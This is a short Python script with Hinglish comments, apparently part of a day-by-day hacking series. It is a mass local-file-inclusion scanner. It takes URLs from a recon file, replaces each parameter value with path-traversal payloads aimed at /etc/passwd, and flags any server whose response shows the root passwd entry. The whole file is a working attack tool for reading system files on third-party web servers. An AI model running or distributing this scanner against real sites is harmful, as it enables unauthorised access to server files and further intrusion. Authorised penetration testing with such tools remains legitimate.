import requests
import sys

def mass_lfi_scan(file_path):
    print(f"\n[*] Bhai, loading target URLs for LFI from: {file_path}")
    
    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
    except FileNotFoundError:
        print("[-] Arre yaar, file nahi mili. Path check karo!")
        return

    print("[*] Filtering URLs for LFI testing...")
    target_urls = []
    
    # Extract clean URLs with parameters
    for line in lines:
        if "http" in line and "=" in line:
            clean_url = line.strip().replace("-> ", "").replace("->", "").strip()
            # LFI ke liye hum "=" ke baad ka sab kuch hata denge aur apna payload lagayenge
            base_url = clean_url.split("=")[0] + "="
            if base_url not in target_urls: # Duplicate check
                target_urls.append(base_url)

    print(f"[+] Extracted {len(target_urls)} unique parameter URLs!\n")
    print("--------------------------------------------------")

    # The Hacker's LFI Payloads
    # Linux system target karne ke liye
    payloads = [
        "../../../../../../../../etc/passwd",
        "/etc/passwd"
    ]

    # Ek-ek karke saare URLs par automate attack
    for url in target_urls:
        for payload in payloads:
            vuln_url = url + payload
            print(f"[*] Testing LFI: {vuln_url}")
            
            try:
                # Server par request bhejna
                response = requests.get(vuln_url, timeout=5)
                
                # Check for /etc/passwd contents (root user hamesha hota hai)
                if "root:x:0:0:" in response.text:
                    print(f"\n   [!!!] BINGO 🎯 LFI VULNERABILITY FOUND!")
                    print(f"   [!!!] We can read server files at: {vuln_url}\n")
                    break # Agla payload check karne ki zaroorat nahi
                        
            except requests.exceptions.RequestException:
                print(f"   [-] Connection skipped/timeout for this URL.")

    print("--------------------------------------------------")
    print("[+] LFI Mass Scan Complete, Bhai!")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 mass_lfi.py <path_to_urls.txt>")
        print("Example: python3 mass_lfi.py ../Day_56_Master_Recon_Pipeline/wayback_urls.txt")
        sys.exit(1)
        
    target_file = sys.argv[1]
    mass_lfi_scan(target_file)
